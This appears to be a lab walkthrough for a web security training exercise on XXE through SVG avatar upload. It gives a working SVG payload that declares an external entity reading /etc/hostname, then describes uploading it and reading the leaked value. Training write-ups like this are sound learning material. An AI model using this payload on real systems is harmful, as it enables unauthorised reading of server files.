# Lab: Exploiting XXE via image file upload

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/ef60f755-d4c3-459b-a452-ee166070cfe3)

## Solution

Create a local SVG image with the following content:

```XML
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/3e02627c-f89c-474a-bdc3-2ce4efcfa960)

Post a comment under any post and choose the malicious svg as the avatar.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/c7dcfd64-a790-4957-8c8d-bf175327905c)

Go to the posted comment and open the avatar image in a new tab.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/c2fe2ef3-06ab-470d-81c4-2cba69eb7f88)

The avatar image should contain the hostname.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/9adb2177-32d4-46d9-84ee-82ee1e80fa9b)

Enter the hostname in the **"Submit Solution"** section.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/38c841ef-a175-4473-ac1d-4a8bce8cf6ec)

Submitting the correct hostname solves the lab.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/7e61b930-4bb9-4e2c-aac6-56c91b697c9c)
